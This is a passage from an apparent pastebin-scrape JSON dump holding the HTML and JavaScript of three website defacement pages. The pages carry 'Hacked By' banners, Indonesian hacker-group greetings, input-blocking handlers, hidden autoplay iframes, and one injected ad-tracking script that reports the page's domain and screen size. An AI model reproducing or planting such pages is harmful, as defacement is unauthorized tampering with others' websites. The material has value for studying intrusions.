href='https:\/\/scontent-a-sin.xx.fbcdn.net\/hphotos-xpa1\/v\/t1.0-9\/15487_671175589647018_4705148860226276746_n.jpg?oh=9b204232fa662d4fb206f6b8c64f68d4&oe=54E0020D' \/>\r\n   <title>.:: Gboys_Flush ::. <\/title>\r\n   <meta content=\"text\/html; charset=utf-8\" http-equiv=\"Content-Type\" \/>\r\n   <style type=\"text\/css\"> \r\n\r\n\r\n      *,html,body,div,p,h2{padding: 0px;margin: 4px;}body{background: url(\"http:\/\/cdn.wonderfulengineering.com\/wp-content\/uploads\/2016\/01\/black-wallpaper-4.jpg\");}#container{margin: 0 auto;width: 980px;padding-top: 40px;}#content-container{float: left;width: 980px;}#content{clear: left;float: left;width: 581px;padding: 20px 0 20px 0;margin: 0 0 0 30px;play: inline;color: #333;}#content h2 {font-family: Cambria;font-size: 170px;}#aside{float: right;width: 348px;padding: 0px;display: inline;background-image: url('http:\/\/');height: 376px;}.hacker{float: right;font-family: Cambria;font-size: 30px;font-weight: bold;}.notes{padding-top: 90px;line-height: 1.3em;font-weight: bold;font-size: 16px;font-family: \"Courier New\";}.contact{padding-top: 30px;font-size: 18px;font-family: \"Courier New\", Courier, monospace;font-weight: bold;color: #800000;}#music{padding: 80px 80px 0px 0px;float: right;clear: right;}.STYLE1 {\r\n      padding-top: 20px;\r\n      line-height: 1.3em;\r\n      font-weight: bold;\r\n      font-size: 15px;\r\n      font-family: \"Courier New\";\r\n      border-width: 100;\r\n      width: 900px;\r\n      }\r\n      .STYLE4 {color: #990000}\r\n      .STYLE5 {color: #00FF00}\r\n      .STYLE9 {color: #33FF00}\r\n      body,td,th {\r\n      color: #FFFFFF;\r\n      }\r\n      .STYLE10 {color: maroon}\r\n      .STYLE11 {color: #FF0000}\r\n   <\/style>\r\n   <\/head> \r\n   <script type=\"text\/javascript\">\/*<![CDATA[*\/ \r\n      TypingText = function(element, interval, cursor, finishedCallback) {\r\n      \r\n       \r\n      \r\n        if((typeof document.getElementById == \"undefined\") || (typeof element.innerHTML == \"undefined\")) {\r\n      \r\n       \r\n      \r\n          this.running = true;\r\n      \r\n       \r\n      \r\n          return;\r\n      \r\n       \r\n      \r\n        }\r\n      \r\n       \r\n      \r\n        this.element = element;\r\n      \r\n       \r\n      \r\n        this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });\r\n      \r\n       \r\n      \r\n        this.interval = (typeof interval == \"undefined\" ? 100 : interval);\r\n      \r\n       \r\n      \r\n        this.origText = this.element.innerHTML;\r\n      \r\n       \r\n      \r\n        this.unparsedOrigText = this.origText;\r\n      \r\n       \r\n      \r\n        this.cursor = (cursor ? cursor : \"\");\r\n      \r\n       \r\n      \r\n        this.currentText = \"\";\r\n      \r\n       \r\n      \r\n        this.currentChar = 0;\r\n      \r\n       \r\n      \r\n        this.element.typingText = this;\r\n      \r\n       \r\n      \r\n        if(this.element.id == \"\") this.element.id = \"typingtext\" + TypingText.currentIndex++;\r\n      \r\n       \r\n      \r\n        TypingText.all.push(this);\r\n      \r\n       \r\n      \r\n        this.running = false;\r\n      \r\n       \r\n      \r\n        this.inTag = false;\r\n      \r\n       \r\n      \r\n        this.tagBuffer = \"\";\r\n      \r\n       \r\n      \r\n        this.inHTMLEntity = false;\r\n      \r\n       \r\n      \r\n        this.HTMLEntityBuffer = \"\";\r\n      \r\n       \r\n      \r\n      }\r\n      \r\n       \r\n      \r\n      TypingText.all = new Array();\r\n      \r\n       \r\n      \r\n      TypingText.currentIndex = 0;\r\n      \r\n       \r\n      \r\n      TypingText.runAll = function() {\r\n      \r\n       \r\n      \r\n        for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();\r\n      \r\n       \r\n      \r\n      }\r\n      \r\n       \r\n      \r\n      TypingText.prototype.run = function() {\r\n      \r\n       \r\n      \r\n        if(this.running) return;\r\n      \r\n       \r\n      \r\n        if(typeof this.origText == \"undefined\") {\r\n      \r\n       \r\n      \r\n          setTimeout(\"document.getElementById('\" + this.element.id + \"').typingText.run()\", this.interval);\r\n      \r\n       \r\n      \r\n          return;\r\n      \r\n       \r\n      \r\n        }\r\n      \r\n       \r\n      \r\n        if(this.currentText == \"\") this.element.innerHTML = \"\";\r\n      \r\n       \r\n      \r\n        if(this.currentChar < this.origText.length) {\r\n      \r\n       \r\n      \r\n          if(this.origText.charAt(this.currentChar) == \"<\" && !this.inTag) {\r\n      \r\n       \r\n      \r\n            this.tagBuffer = \"<\";\r\n      \r\n       \r\n      \r\n            this.inTag = true;\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else if(this.origText.charAt(this.currentChar) == \">\" && this.inTag) {\r\n      \r\n       \r\n      \r\n            this.tagBuffer += \">\";\r\n      \r\n       \r\n      \r\n            this.inTag = false;\r\n      \r\n       \r\n      \r\n            this.currentText += this.tagBuffer;\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else if(this.inTag) {\r\n      \r\n       \r\n      \r\n            this.tagBuffer += this.origText.charAt(this.currentChar);\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else if(this.origText.charAt(this.currentChar) == \"&\" && !this.inHTMLEntity) {\r\n      \r\n       \r\n      \r\n            this.HTMLEntityBuffer = \"&\";\r\n      \r\n       \r\n      \r\n            this.inHTMLEntity = true;\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else if(this.origText.charAt(this.currentChar) == \";\" && this.inHTMLEntity) {\r\n      \r\n       \r\n      \r\n            this.HTMLEntityBuffer += \";\";\r\n      \r\n       \r\n      \r\n            this.inHTMLEntity = false;\r\n      \r\n       \r\n      \r\n            this.currentText += this.HTMLEntityBuffer;\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else if(this.inHTMLEntity) {\r\n      \r\n       \r\n      \r\n            this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);\r\n      \r\n       \r\n      \r\n            this.currentChar++;\r\n      \r\n       \r\n      \r\n            this.run();\r\n      \r\n       \r\n      \r\n            return;\r\n      \r\n       \r\n      \r\n          } else {\r\n      \r\n       \r\n      \r\n            this.currentText += this.origText.charAt(this.currentChar);\r\n      \r\n       \r\n      \r\n          }\r\n      \r\n       \r\n      \r\n          this.element.innerHTML = this.currentText;\r\n      \r\n       \r\n      \r\n          this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == \"function\" ? this.cursor(this.currentText) : this.cursor) : \"\");\r\n      \r\n       \r\n      \r\n          this.currentChar++;\r\n      \r\n       \r\n      \r\n          setTimeout(\"document.getElementById('\" + this.element.id + \"').typingText.run()\", this.interval);\r\n      \r\n       \r\n      \r\n        } else {\r\n      \r\n       \r\n      \r\n      \tthis.currentText = \"\";\r\n      \r\n       \r\n      \r\n      \tthis.currentChar = 0;\r\n      \r\n       \r\n      \r\n              this.running = false;\r\n      \r\n       \r\n      \r\n              this.finishedCallback();\r\n      \r\n       \r\n      \r\n        }\r\n      \r\n       \r\n      \r\n      }\r\n      \r\n       \r\n      \r\n       \r\n      \r\n       \r\n      \r\n      \/*]]>*\/\r\n   <\/script> \r\n   <body onLoad=\"animate();start()\" onresize=\"resize()\" onorientationchange=\"resize()\" onmousedown=\"context.fillStyle='rgba(0,0,0,'+opacity+')'\" onmouseup=\"context.fillStyle='rgb(0,0,0)'\">\r\n      <p class=\"STYLE1\" id=\"message\">\t\t\r\n         <font color=\"aqua\">root@world:~#<\/font><span class=\"STYLE11\">Please Read Me..!!!<\/span><br \/> \r\n         <a href=\"https:\/\/www.facebook.com\/groups\/Dark.Defence\/\">Gue Hanya Sampah<\/a> !!<br \/> \r\n         <font color='aqua'><i>\" Hacked By : Gboys_Flush \"<\/i><\/font><br \/><br \/>\r\n         <font color=\"yellow\">fuck: <\/font><span class=\"STYLE11\">Teman Musiman..!!! :D <\/span><br \/> \r\n         <font color=\"red\">Banyak yang bilang kalo di dunia underground itu banyak teman musiman..!<\/font> <font color=\"red\"><\/font><font \r\n         color=\"red\"Teman musiman itu seperti apakah..?  \r\n<\/font>Katanya sih mereka selalu datang saat ada perlunya saja.., Disaat mereka sudah mendapatkan apa yang mereka inginkan mereka pergi begitu saja..! Apalah daya gue cuma seorang newbie, Yang masih mengemis\" pada sang mastah..!!<font color=\"red\">Dah gitu aja curhatan gue.. :D<font \r\n          \/>  <br \/> \r\n         <font color=\"aqua\">root@world:~# <\/font><span class=\"STYLE11\">Jus't Test our security<\/span><br \/> \r\n         <font color=\"aqua\">Jadilah teman yang selalu ada disaat susah n' senang<br \/><br \/>\r\n         <span class=\"STYLE9\">[+] cintailah temanmu seikhlas hatimu :)<\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] jangan pernah mengecewakan temanmu disaat dia mempercayaimu<\/span><br \/>\r\n         <span class=\"STYLE9\">[+] susah dan senang selalu bersama jangan cuma ada maunya saja baru ingat dia<\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] buat gue arti teman itu sangat berarti buat kehidupan<\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] gak ada teman hidup lu gk akan berarti apa-apa <\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] jagalah temanmu itu sebaik mungkin :) <\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] jangan pernah kamu manfaatkan temanmu itu yg sudah mempercayaimu<\/span><br \/>\r\n\t <span class=\"STYLE9\">[+] Dah gitu aja peace and love :D<\/span><br \/>\r\n      <font color=\"aqua\">Offical groups : <\/font><span class=\"STYLE11\">~ DARK DEFENCE CYBER TEAM ~ SUBMIT DEFACER TEAM ~ Hacker Team ~ DEFACER TERSAKITI TEAM ~ INDOXPLOIT ~ INCEF ~ SEC7OR ~ T1KUS90T ~ T.I-SNIPER ~ INDONESIAN CODE PARTY ~ ALL TEAM INDONESIA HACKER ~<\/span><br \/>\r\n\t  <p class=\"notes\">&nbsp;<\/p>\r\n      <br \/> \r\n      <script language=JavaScript type=text\/javascript><!--\/\/ Method-5 animation script (compressed)\r\n         \/***** initialize global film variables ******\/\r\n         var frames = 31; \/\/ <---- total number of pictures in film\r\n         var delay = 90; \/\/ <---- delay after each frame\r\n         var color = \"brown\"; \/\/ <---- Color of cat\r\n         var changecol = false; \/\/ <---- Randomly change color of cat? If true the cat will change colors if false the color of the cat will be the value of the color variable.\r\n         var move_cat = true; \/\/ <---- Move cat? If true the cat will move side to side. If false the cat will stay in one place.\r\n         var cat_fontsize = 10; \/\/ <---- In pixels\r\n         \r\n         \/***** initialize anim screen position (in pixels) *****\/\r\n         \r\n         var topp = 50; \/\/ <---- window position bottom\r\n         var left = (move_cat)?-20:-10; \/\/ <---- window position left\r\n         var width = 300; \/\/ <---- window width\r\n         var height = 187; \/\/ <---- window height\r\n         \r\n         \r\n         \/***** initialize anim control variables *****\/\r\n         \r\n         var posi = 0; \/\/ <---- actual picture position (frame counter)\r\n         var prev = 1; \/\/ <---- previous picture number\r\n         var run = true; \/\/ <---- boolean : true (?????) or !true (?????)\r\n         \r\n         \r\n         \/***** initialize style sheets ****\/\r\n         \r\n         document.write(\"<\" + \"style type='text\/css'><\" + \"!-- \");\r\n         for (i = 0; i <= frames; i++) {\r\n             if (move_cat) {\r\n                 left = left + 2;\r\n             }\r\n             document.write(\"#cat\" + i + \" {position:absolute; color:\" + color + \"; font-size:\" + cat_fontsize + \"px; left:\" + left + \"%; top:\" + topp + \"px; width:\" + width + \"px; height:\" + height + \"px; z-index:\" + i + \"; visibility:hidden}\");\r\n         }\r\n         document.write(\"--\" + \"><\" + \"\/style>\");\r\n         \r\n         \/******* animation module ******\/\r\n         function change_color() {\r\n             var colors = new Array(\"#6C2DC7\", \"#00FFFF\", \"#00FF00\", \"#FFFF00\", \"#FF0000\", \"#FF00FF\", \"#1589FF\", \"#8D38C9\", \"#E3319D\", \"#6C2DC7\", \"#7E354D\", \"#736AFF\", \"#306754\", \"#E45E9D\", \"#000099\", \"#33CC00\", \"#25A0C5\");\r\n             var randomnum = Math.floor(Math.random() * 17)\r\n             var random_color = colors[randomnum];\r\n         \tfor(i=0;i<=frames;i++) {\r\n         \t\tif(i==0) {\r\n         \t\t\r\n         \t\t}\r\n         \t\telse {\r\n         \t\t\tdocument.getElementById('cat' + i).style.color = random_color;\r\n         \t\t}\r\n         \t}\r\n         }\r\n         \r\n         function animate() {\r\n             posi = posi + 1;\r\n             if (posi > frames) {\r\n                 if (run) {\r\n                     if (changecol && move_cat) {\r\n                         setTimeout(\"animate2(posi-1, prev); change_color();\", delay);\r\n                     } else if (changecol && !move_cat) {\r\n                         posi = 1;\r\n                         setTimeout(\"animate(); change_color();\", delay);\r\n                     } else if (!changecol && move_cat) {\r\n                         setTimeout(\"animate2(posi-1, prev);\", delay);\r\n                     } else if (!changecol && !move_cat) {\r\n                         posi = 1;\r\n                         setTimeout(\"animate();\", delay);\r\n                     }\r\n                 }\r\n             } else {\r\n                 document.getElementById(\"cat\"+ prev).style.visibility = 'hidden';\r\n                 document.getElementById(\"cat\"+ posi).style.visibility = 'visible';\r\n                 prev = posi;\r\n                 if (run) setTimeout(\"animate()\", delay);\r\n             }\r\n         }\r\n         \r\n         function animate2(posi2, prev2) {\r\n             posi = posi2 - 1;\r\n             if (posi < 1) {\r\n                 if (run) {\r\n                     if (changecol) {\r\n                         setTimeout(\"animate(); change_color();\", delay);\r\n                     } else {\r\n                         setTimeout(\"animate();\", delay);\r\n                     }\r\n                 }\r\n             } else {\r\n                 document.getElementById(\"cat\"+ prev).style.visibility = 'hidden';\r\n                 document.getElementById(\"cat\"+ posi).style.visibility = 'visible';\r\n                 prev = posi;\r\n                 if (run) setTimeout(\"animate2(posi, prev-1)\", delay);\r\n             }\r\n         }\r\n         \/\/--><\/SCRIPT>\r\n      <DIV id=cat1>\r\n         <PRE>\r\n  <iframe width=\"1\" height=\"1\" src=\"https:\/\/www.youtube.com\/embed\/_oEi9Se6MlA?rel=0&autoplay=1&loop=1&playlist=_oEi9Se6MlA\" frameborder=\"0\" allowfullscreen><\/iframe>\r\n<\/html>\r\n<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>\r\n<script src='http:\/\/yourjavascript.com\/1171704334\/efek-salju-faisal.js' type='text\/javascript'\/><\/script> \r\n\r\n\r\n<\/PRE>\r\n      <\/DIV>\r\n      <script type=\"text\/javascript\">\/*<![CDATA[*\/ \r\n         new TypingText(document.getElementById(\"message\"), 40, function(i){ var ar = new Array(\"_\", \" \", \"_\", \" \"); return \" \" + ar[i.length % ar.length]; });\r\n         \r\n          \r\n         \r\n          \r\n         \r\n          \r\n         \r\n         \/\/Type out examples:\r\n         \r\n          \r\n         \r\n         TypingText.runAll();\r\n         \r\n          \r\n         \r\n           \/*]]>*\/\r\n\r\n      <\/script>\r\n<script type=\"text\/javascript\"> \/\/<![CDATA[","domain":["1e100.net","fbcdn.net","facebook.com","daniel-geers.de","w3.org","yourjavascript.com","youtube.com","wonderfulengineering.com"],"host":["par10s28-in-f110","par10s34-in-f14","edge-star-mini6-shv-01-cdt1","xx-fbcdn6-shv-02-sin6","par21s17-in-f14","xx-fbcdn-shv-01-sin2","par10s33-in-f14","par10s22-in-f238","par21s07-in-f14","par21s04-in-f174","par10s22-in-f14","par21s11-in-f14","par21s05-in-f14","par10s38-in-f14","www","host","par21s06-in-f14","ams16s32-in-x0e","edge-star-mini6-shv-02-frt3","par21s03-in-f14","par21s06-in-f238","par21s17-in-x0e","edge-star-mini6-shv-01-atl3","cdn","fra02s18-in-f14","scontent-a-sin","par10s27-in-f206","edge-star-mini-shv-01-atl3","mail","par21s03-in-f142","par10s29-in-f14","edge-star-mini-shv-01-ams3","par21s04-in-f14","ham02s14-in-f206","par10s29-in-f238","hans-moleman","par10s27-in-f14","par10s28-in-f14","par21s05-in-f142"],"hostname":["ams16s32-in-x0e.1e100.net","www.w3.org","host.wonderfulengineering.com","par21s04-in-f174.1e100.net","par10s33-in-f14.1e100.net","edge-star-mini6-shv-02-frt3.facebook.com","par10s38-in-f14.1e100.net","par21s17-in-x0e.1e100.net","par21s06-in-f238.1e100.net","par10s28-in-f110.1e100.net","hans-moleman.w3.org","par10s22-in-f14.1e100.net","par10s22-in-f238.1e100.net","edge-star-mini6-shv-01-cdt1.facebook.com","scontent-a-sin.xx.fbcdn.net","par10s34-in-f14.1e100.net","ham02s14-in-f206.1e100.net","par21s11-in-f14.1e100.net","par21s04-in-f14.1e100.net","par21s03-in-f142.1e100.net","www.facebook.com","edge-star-mini6-shv-01-atl3.facebook.com","edge-star-mini-shv-01-atl3.facebook.com","cdn.wonderfulengineering.com","par10s29-in-f238.1e100.net","edge-star-mini-shv-01-ams3.facebook.com","par10s27-in-f14.1e100.net","par21s05-in-f142.1e100.net","www.youtube.com","mail.daniel-geers.de","par10s27-in-f206.1e100.net","xx-fbcdn6-shv-02-sin6.fbcdn.net","xx-fbcdn-shv-01-sin2.fbcdn.net","fra02s18-in-f14.1e100.net","par21s17-in-f14.1e100.net","par21s07-in-f14.1e100.net","par21s05-in-f14.1e100.net","par10s28-in-f14.1e100.net","par21s06-in-f14.1e100.net","par21s03-in-f14.1e100.net","par10s29-in-f14.1e100.net"],"ip":["2603:400a:ffff:804:801e:34:0:25","2a03:2880:f111:83:face:b00c:0:25de","216.58.198.206","2a00:1450:400e:80c:0:0:0:200e","216.58.204.110","216.58.205.14","2a03:2880:f11c:8183:face:b00c:0:25de","172.217.18.206","185.60.216.35","151.139.241.16","216.58.206.238","216.58.209.238","216.58.213.174","31.13.65.36","2a03:2880:f00c:212:face:b00c:0:3","216.58.201.238","2a03:2880:f130:83:face:b00c:0:25de","157.240.24.31","172.217.19.238","216.58.215.46","128.30.52.100","2a00:1450:4007:808:0:0:0:200e","216.58.208.238","216.58.204.142","31.13.91.36","216.58.213.142","216.58.204.238","209.59.165.87","128.30.52.37","5.189.183.184"],"key":"Yb39Yqzj","scheme":["https","http"],"seen_date":"2018-11-16","size":"15506","source":"pastebin","subdomains":"xx.fbcdn.net","syntax":"text","tld":["net","de","com","org"],"url":["https:\/\/www.youtube.com\/embed\/_oEi9Se6MlA?rel=0&autoplay=1&loop=1&playlist=_oEi9Se6MlA","http:\/\/cdn.wonderfulengineering.com\/wp-content\/uploads\/2016\/01\/black-wallpaper-4.jpg","https:\/\/www.facebook.com\/groups\/Dark.Defence\/","http:\/\/www.w3.org\/1999\/xhtml","https:\/\/scontent-a-sin.xx.fbcdn.net\/hphotos-xpa1\/v\/t1.0-9\/15487_671175589647018_4705148860226276746_n.jpg?oh=9b204232fa662d4fb206f6b8c64f68d4&oe=54E0020D","http:\/\/yourjavascript.com\/1171704334\/efek-salju-faisal.js"]},{"@category":"pastries","@timestamp":"2018-11-16T22:52:41.000Z","@type":"doc","content":"<head>\r\n<title>Authorization Required<\/title>\r\n<link rel=\"icon\" type=\"image\/png\/ico\" href=\"x.jpg\">\r\n<meta content=\"Hacked By Mr.LawyeenzUI404\" name=\"description\"\/>\r\n<script type=\"text\/javascript\" src=\"http:\/\/code.jquery.com\/jquery-2.1.1.js\"><\/script>\r\n<link href='http:\/\/fonts.googleapis.com\/css?family=Iceland' rel='stylesheet' type='text\/css'>\r\n\r\n<style type=\"text\/css\">body{background:#000;position:absolute;left:0;right:0;top:0%;font-family:castellar;font-size:12px;font-weight:bold;font-size:12px;font-style:bold}<\/style><\/head>\r\n<body>\r\n<body oncontextmenu=\"return false;\" onkeydown=\"return false;\" onmousedown=\"return false;\" style=\"background-color:#000;background-image:url();background-repeat:repeat-y;background-position:center ;\">\r\n<body bgcolor=\"black\">\r\n<body onLoad=\"writetext()\" text=\"lime\" bgcolor=\"#000000\">\r\n<center>\r\n\r\n<center><br>\r\n    <img style=\"border:2px dotted #0404B4;\" src=\"http:\/\/zonehmirrors.org\/defaced\/2014\/06\/23\/siddhivinayakaplayschool.com\/www.tintonz.com\/x.jpg\" width=\"240\" height=\"320\"\/>\r\n<pre id=\"rightwrite\">\r\n<font face=\"Iceland\" size=\"10\" color=\"Red\"><center>\r\nWoops ? Nivenzal Attacker In Here :P<\/center><\/font>\r\n<\/pre>\r\n<\/div>\r\n<font face=\"Iceland\" size=\"6\" color=\"white\">your security service, need more security<\/font><br\/>\r\n<br>\r\n<font face=\"Iceland\" size=\"6\" color=\"white\"> \r\ncheer from me, indonesian people<br\/><\/font>\r\n<font face=\"Iceland\" size=\"5\" color=\"Red\">Greetz :<\/font><font face=\"Iceland\" size=\"5\" color=\"Aqua\"><marquee>Allah SWT - Mr.Localhost- Mr.Oxygen - Server404 - Ice-cream - Ustadcage_48 - XcyberXfuckingX - konslet - Shiro'Tenshi - And You<br\/><\/font>\r\n<\/font><\/b>\r\n<\/center>\r\n<\/font>\r\n\r\n<script type=\"text\/javascript\">$(document).ready(function(){function pulsate(){$(\"#rightwrite\").animate({opacity:0.2},1200,'linear').animate({opacity:1},1200,'linear',pulsate).click(function(){$(this).animate({opacity:1},1200,'linear');$(this).stop();});}pulsate();});<\/script>\r\n\r\n\r\n\r\n\r\n<script type=\"text\/javascript\">if(self==top){var idc_glo_url=(location.protocol==\"https:\"?\"https:\/\/\":\"http:\/\/\");var idc_glo_r=Math.floor(Math.random()*99999999999);document.write(\"<scr\"+\"ipt type=text\/javascript src=\"+idc_glo_url+\"cfs.u-ad.info\/cfspushadsv2\/request\");document.write(\"?id=1\");document.write(\"&amp;enc=telkom2\");document.write(\"&amp;params=\"+\"4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRRbbGziM2k0hYCwJJ1M9nbihYH014DfzYQeQ3ORvbMg9w3zLYM%2byPThuNnOO%2fCsBsxQyq3FVOYPN1E2pnsJp%2bPOyv2EoqItKAElTgBb3mrVJarkTEtYZXoxUJfpstZ5zkhzbLYMy%2bNX4%2bMgvJdODjunA%2f5%2b9WK3yt6jD68G1gI6feqRDzjsqozMPK%2fQ5yzK2SqbcLyzU7DzUCDYj2kU%2f1zf8yqnkHq3kYqlO8aduNY23fh7U4WYjwH48Uxv%2bJDvY%2bz9GADtrF2eD6mBGns0DjJqFjBQ%2fyKmJOgrVbdIocFPBJIuOd7SgKZyXXl9H83o9FpOT8gFbxpybKqDUkp4rcLGsyhMsTRDEofVYx16OAGwjKsufk3Cq8%2fQzkuFcEB9n8jjWRgULsueEkyIzhIEKVioju3x90J%2bZJKSLOoMPDnpyllpzvXcwCKYAjUVCtpHQrQeKuJfwvFCNBrJsmL3gHUT5%2bywNIqlXIARXg4sDVkApWCFA0feD%2f94Sxp10TMue51Mj%2bVomfzFf5Y6PyfeM%2f5iOzOBRwVMrGQoF6dUqiFLkDTFafaQJfDYr7vzPeMPZPR37N%2bK4tVDGj6w7l1a4bOZyOYDjOHzs7mP13I9LqYp9EvGqIQQwq8IIGZlIdmsqdrnecKBkQd7A%3d\");document.write(\"&amp;idc_r=\"+idc_glo_r);document.write(\"&amp;domain=\"+document.domain);document.write(\"&amp;sw=\"+screen.width+\"&amp;sh=\"+screen.height);document.write(\"><\/scr\"+\"ipt>\");}<\/script><noscript>activate javascript<\/noscript><\/body>\r\n<\/html>\r\n    <embed src=\"https:\/\/www.youtube.com\/v\/6bDAqaZGXHw&autoplay=1\" type=\"application\/x-shockwave-flash\" wmode=\"transparent\" width=\"1\" height=\"1\">","domain":["1e100.net","zonehmirrors.org","hwcdn.net","jquery.com","googleapis.com","youtube.com"],"host":["par21s12-in-f14","par21s06-in-f238","par21s03-in-f14","par21s12-in-f4","fonts","par21s05-in-f14","par21s11-in-f14","par21s06-in-f14","www","par10s38-in-f14","par10s29-in-f238","ham02s14-in-f206","par21s04-in-f14","par21s07-in-x04","par21s05-in-f142","par10s28-in-f14","par10s27-in-f14","par21s06-in-x0a","fra02s18-in-f14","par21s03-in-f142","par10s29-in-f14","par10s27-in-f206","par21s17-in-f14","par10s28-in-f110","par10s34-in-f14","par10s28-in-x0e","par21s07-in-f14","par21s04-in-f174","code","vip052","wo-in-x5d","par21s11-in-f10","ams17s01-in-f14","fra02s28-in-f14","par10s33-in-f14"],"hostname":["par21s03-in-f142.1e100.net","vip052.ssl.hwcdn.net","par21s04-in-f14.1e100.net","par21s11-in-f14.1e100.net","fra02s28-in-f14.1e100.net","ham02s14-in-f206.1e100.net","par10s34-in-f14.1e100.net","par21s07-in-x04.1e100.net","code.jquery.com","par21s11-in-f10.1e100.net","par21s06-in-f238.1e100.net","par10s28-in-f110.1e100.net","fonts.googleapis.com","ams17s01-in-f14.1e100.net","par10s38-in-f14.1e100.net","wo-in-x5d.1e100.net","par10s33-in-f14.1e100.net","par21s06-in-x0a.1e100.net","par21s04-in-f174.1e100.net","par21s03-in-f14.1e100.net","par10s29-in-f14.1e100.net","par21s06-in-f14.1e100.net","par10s28-in-f14.1e100.net","par21s05-in-f14.1e100.net","par21s17-in-f14.1e100.net","par21s07-in-f14.1e100.net","par21s12-in-f14.1e100.net","par10s28-in-x0e.1e100.net","fra02s18-in-f14.1e100.net","par10s27-in-f206.1e100.net","par21s05-in-f142.1e100.net","www.youtube.com","par10s27-in-f14.1e100.net","par21s12-in-f4.1e100.net","par10s29-in-f238.1e100.net"],"ip":["216.58.204.142","216.58.213.142","205.185.208.52","216.58.204.238","172.217.22.132","216.58.215.46","172.217.19.238","104.16.14.15","104.31.11.185","2606:4700:31:0:0:0:681f:bb9","216.58.201.238","172.217.22.142","2a00:1450:4007:813:0:0:0:200a","2a00:1450:400c:c07:0:0:0:5d","216.58.213.174","216.58.206.238","216.58.209.238","172.217.19.234","172.217.18.206","2a00:1450:4007:80a:0:0:0:200e","104.31.10.185","216.58.205.14","104.16.15.15","2a00:1450:4007:814:0:0:0:2004","2606:4700:31:0:0:0:681f:ab9","216.58.204.110","216.58.198.206","172.217.20.110"],"key":"gdu13HHi","scheme":["https","http"],"seen_date":"2018-11-16","size":"3424","source":"pastebin","subdomains":"ssl.hwcdn.net","syntax":"text","tld":["org","com","net"],"url":["https:\/\/www.youtube.com\/v\/6bDAqaZGXHw&autoplay=1","http:\/\/fonts.googleapis.com\/css?family=Iceland","http:\/\/zonehmirrors.org\/defaced\/2014\/06\/23\/siddhivinayakaplayschool.com\/www.tintonz.com\/x.jpg","http:\/\/code.jquery.com\/jquery-2.1.1.js"]},{"@category":"pastries","@timestamp":"2018-11-16T22:48:57.000Z","@type":"doc","content":"<html>\r\n<head>\r\n<meta charset=\"UTF-8\">\r\n<script type=\"text\/javascript\">\r\n\/\/<![CDATA[\r\ntry{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:\"cf\",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:\"\/cdn-cgi\/nexp\/dok3v=1613a3a185\/\"},atok:\"42ad8ee34e8bb9bb12dcb07dbdcb9e6a\",petok:\"cbdda579fd1ab41374935f2e371f51c0dad9f3c7-1488756656-1800\",zone:\"defacer.id\",rocket:\"a\",apps:{}}];document.write('<script type=\"text\/javascript\" src=\"\/\/ajax.cloudflare.com\/cdn-cgi\/nexp\/dok3v=f2befc48d1\/cloudflare.min.js\"><'+'\\\/script>');}}catch(e){};\r\n\/\/]]>\r\n<\/script>\r\n<link rel=\"icon\" type=\"image\/png\" href=\"https:\/\/4.bp.blogspot.com\/-bB4KCjP2TaU\/WJ-i-v7p8KI\/AAAAAAAABCs\/U13xOZgij2Q0HAvlgDKzUmC4aTO57nkgACLcB\/s1600\/jj.png\"\/>\r\n<link href=\"https:\/\/fonts.googleapis.com\/css?family=Bungee+Shade|Monoton|Nova+Square\" rel=\"stylesheet\">\r\n<meta property=\"og:title\" content=\"N45HT | Mr.x0x\"\/>\r\n<meta property=\"og:image\" content=\"https:\/\/4.bp.blogspot.com\/-bB4KCjP2TaU\/WJ-i-v7p8KI\/AAAAAAAABCs\/U13xOZgij2Q0HAvlgDKzUmC4aTO57nkgACLcB\/s1600\/jj.png\">\r\n<title>?<\/title>\r\n<style>#xr{border-top:0px solid #ababab;border-bottom:0px solid #ababab;font-family:Orbitron,monospace;color:darkred;font-size:15px;width= \"75%\"}#xr:hover{color:#00ff00;text-shadow:#22EDF0 1px 1px 30px;}@font-face{font-family:'Orbitron';font-style:normal;font-weight:700;src:local('Orbitron-Bold'),url(http:\/\/fonts.gstatic.com\/s\/orbitron\/v7\/Y82YH_MJJWnsH2yUA5AuYY4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000;}pre{text-align:center;}html{overflow-y:hidden;}body{background-repeat:no-repeat;background-position:center;background-color:#000000;cursor:none;margin:0px;}#shadow{position:fixed;left:0px;right:0px;bottom:130px;text-align:center;text-shadow:darkred 1px 1px 30px;}#shadow{position:fixed;left:0px;right:0px;top:20px;text-align:center;text-shadow:darkblue 1px 1px 30px;}shadow1{font-family:Architects Daughter;color:#ffffff;text-shadow:#22EDF0 1px 1px 30px;}<\/style>\r\n<\/head>\r\n<body translate=\"no\">\r\n<canvas id=\"c\" height=\"667\" width=\"1366\">\r\n<\/canvas>\r\n<div id=\"dp_card\">\r\n<script 